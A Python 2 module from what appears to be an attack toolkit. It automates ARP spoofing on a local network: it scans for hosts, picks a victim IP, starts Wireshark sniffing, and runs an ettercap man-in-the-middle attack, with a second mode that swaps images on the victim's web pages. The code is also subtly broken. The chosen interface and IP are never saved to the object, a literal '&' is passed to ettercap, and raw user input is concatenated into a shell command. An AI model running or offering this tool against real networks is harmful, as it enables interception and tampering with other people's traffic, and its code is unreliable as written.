#!/usr/bin/python
import os
import subprocess
import re
import colors
import attackBase

class ArpSpoofing(attackBase.Attack):
	interface = "eth0"
	ipAddress = ""
	shellCol = colors.ShellColors
	def ifaceData(self):
		#subprocess.call(["ifconfig"])
		print "\nAvailable Interfaces: "
		subprocess.call(["ls", "/sys/class/net"])
                interface = raw_input(self.shellCol.UNDERLINE + self.shellCol.BLUE + "\nSelect Interface: " + self.shellCol.ENDC)
		interfaceData = os.popen('ifconfig ' + interface + '| grep "inet\ Ad" | cut -d: -f2 | cut -d" " -f1') 
		print self.shellCol.BLUE + "\nSelect one of the shown Addresses to attack: " + self.shellCol.ENDC
		subprocess.call(["arp-scan", "--interface="+interface, "--localnet"])
		ipAddress = raw_input(self.shellCol.BLUE + "Select IP Address: " + self.shellCol.ENDC)
		# Check if IP Address has a valid format
		matchObj = re.match(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", ipAddress)		
		if matchObj:
			print self.shellCol.BOLD + self.shellCol.GREEN + "\nSelected Address: " + ipAddress + "\n" + self.shellCol.ENDC
		else:
			print self.shellCol.BOLD + self.shellCol.FAILURE + "\nAddress not valid\n" + self.shellCol.ENDC

                #ipAddress = interfaceData.read()

	# Starts a normal MITM attack and sniffes the network traffic of the attacked host.
	def ettercapMITM(self):
		self.ifaceData()
		print("Starting wireshark")
		# Start wireshark on selected interface and automatically start sniffing
		wiresharkRunning = subprocess.Popen(["wireshark", "-i", self.interface, "-k"])
		if(wiresharkRunning):
#		print("Waiting for wireshark")
#		time.sleep(5)
			print("Wireshark started")
			raw_input("Press Enter to start MITM")
			# Start ettercap on given interface and ip address and start MITM attack
			subprocess.call(["ettercap", "-T", "-i", self.interface, "-M", "ARP", "/"+self.ipAddress+"//", "///", "&"])

	# Replaces all images of websites on the attacked host
	def ettercapFun(self):
		self.ifaceData()
		filter = "/usr/share/ettercap/test.ef"
		subprocess.call(["ettercap", "-T", "-q", "-F", filter, "-i", self.interface, "-M", "ARP", "/"+self.ipAddress+"//", "///", "&"])
	
	
	@staticmethod
	def start(self, index):
		if(index == 1):
			self.ettercapMITM()
		elif(index == 2):
			self.ettercapFun()

	def help(self): pass
